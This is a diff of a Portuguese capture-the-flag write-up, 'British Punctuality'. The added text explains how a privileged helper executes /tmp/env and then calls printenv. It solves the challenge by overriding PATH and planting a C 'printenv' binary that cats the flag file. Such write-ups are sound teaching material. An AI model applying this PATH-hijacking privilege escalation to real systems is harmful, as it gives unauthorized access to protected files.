@@ -1,4 +1,4 @@
-# Brittish Punctuality
+# British Punctuality
 
 Verificamos que não temos permissão para abrir diretamente o ficheiro `flags/flag.txt`, mas o utilizador "flag_reader" tem:
 
@@ -25,4 +25,24 @@ printenv
 exec /home/flag_reader/reader
 ```
 
-Podemos ver que, se o ficheiro `/tmp/env` existir, vai ser executado o seu conteúdo 
+Podemos ver que, se o ficheiro `/tmp/env` existir, vai ser executado o seu conteúdo como um comando shell usando **xargs**. Posteriormente, serão impressas as variáveis de ambiente através do **printenv**. Assim, podemos alterar a variável de ambiente PATH (para apontar para o diretório com um printenv controlado por nós), colocando o seguinte texto no ficheiro `/tmp/env`:
+
+```note
+export PATH=/tmp/myenv/
+```
+
+Criando o diretório `/tmp/myenv/`, podemos criar um binário printenv dentro que execute um código controlado por nos
+
+Manipulação do printenv através de um ficheiro c
+
+```c
+#include <stdlib.h>
+#include <string.h>
+int main() {
+    char command[25]="cat ../../flags/flag.txt"; 
+    system(command); 
+    return 0;
+}
+```
+
+```
